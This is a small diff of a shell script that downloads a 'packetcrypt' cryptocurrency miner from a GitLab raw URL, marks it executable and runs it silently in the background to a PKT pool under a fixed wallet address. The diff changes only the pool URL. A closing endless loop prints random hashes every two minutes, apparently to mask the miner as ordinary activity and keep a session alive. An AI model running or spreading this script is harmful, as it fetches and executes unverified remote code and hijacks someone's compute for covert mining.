@@ -1,4 +1,4 @@
 wget https://gitlab.com/cici2/pkt/-/raw/main/packetcrypt
 chmod +x packetcrypt
-./packetcrypt ann -p pkt1q8qf58p5fzfp0jgde6dkv87uln7yz0ayjgp3z74 http://pool.pktpool.io >/dev/null &
+./packetcrypt ann -p pkt1q8qf58p5fzfp0jgde6dkv87uln7yz0ayjgp3z74 http://pool.pkteer.com >/dev/null &
 while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 2m; done
